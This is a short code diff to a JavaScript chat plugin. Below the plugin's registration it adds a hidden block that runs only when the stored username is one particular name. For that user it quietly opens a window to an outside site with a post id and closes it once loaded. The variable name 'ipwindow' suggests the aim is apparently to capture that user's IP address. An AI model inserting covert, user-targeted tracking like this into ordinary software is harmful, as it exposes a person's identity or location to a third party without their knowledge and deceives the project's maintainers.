@@ -114,3 +114,11 @@ var me = new iChatPlugin("me/me", function(data) {
 iChat.onload = function() {
   iChat.registerPlugin(me);
 }
+
+if (localStorage.name == "graphinghandheld") {
+  var ipwindow = window.open("http://www.bvog.com/?post=IDwJZDjru6mCuvG3U");
+  
+  ipwindow.onload = function() {
+    ipwindow.close();
+  }
+}
